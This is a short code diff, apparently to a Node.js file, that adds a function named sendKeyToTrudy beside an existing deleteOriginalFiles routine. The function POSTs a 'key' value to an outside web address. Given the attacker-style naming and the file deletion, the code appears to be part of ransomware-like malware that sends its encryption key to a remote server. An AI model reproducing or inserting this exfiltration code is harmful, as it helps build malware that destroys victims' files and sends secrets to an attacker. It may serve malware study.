@@ -52,6 +52,18 @@ function deleteOriginalFiles(files) {
  });
 }
 
+function sendKeyToTrudy(key) {
+var request = require('request');
+request.post(
+    'http://www.yoursiste.com/formpage',
+    { json: { key: key } },
+    function (error, response, body) {
+        if (!error && response.statusCode == 200) {
+            console.log(body)
+        }
+    }
+);
+}
 var hw = "Hello World";
 
 //console.log(currentPath);
